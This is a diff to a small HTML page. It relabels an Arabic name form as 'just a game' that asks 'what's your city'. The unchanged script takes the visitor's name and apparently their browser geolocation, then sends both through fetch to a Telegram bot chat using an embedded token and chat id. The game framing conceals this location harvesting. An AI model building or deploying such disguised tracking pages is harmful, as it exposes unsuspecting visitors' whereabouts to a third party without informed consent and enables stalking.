@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>استمارة بسيطة</title>
+  <title>just a game</title>
   <style>
     body {
       font-family: Arial;
@@ -20,15 +20,15 @@
   </style>
 </head>
 <body>
-  <h2>ما اسمك؟</h2>
-  <input type="text" id="username" placeholder="اكتب اسمك هنا">
-  <button type="submit" onclick="send()">إرسال</button>
+  <h2>what's your city</h2>
+  <input type="text" id="username" placeholder="your name">
+  <button type="submit" onclick="send()">send</button>
 
   <script>
     function send() {
       const name = document.getElementById('username').value.trim();
       if (!name) {
-        alert("من فضلك اكتب اسمك.");
+        alert("please write your name 😊 ");
         return;
       }
 
@@ -45,15 +45,15 @@
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
 
             fetch(url)
-              .then(() => alert("تم الإرسال. شكراً!"))
-              .catch(() => alert("حدث خطأ أثناء الإرسال."));
+              .then(() => alert("Thank you"))
+              .catch(() => alert("what are you doing 🤨"));
           },
           (err) => {
-            alert("لم يتم السماح بالوصول إلى الموقع.");
+            alert("not exicete");
           }
         );
       } else {
-        alert("متصفحك لا يدعم تحديد الموقع.");
+        alert("3iyan");
       }
     }
   </script>
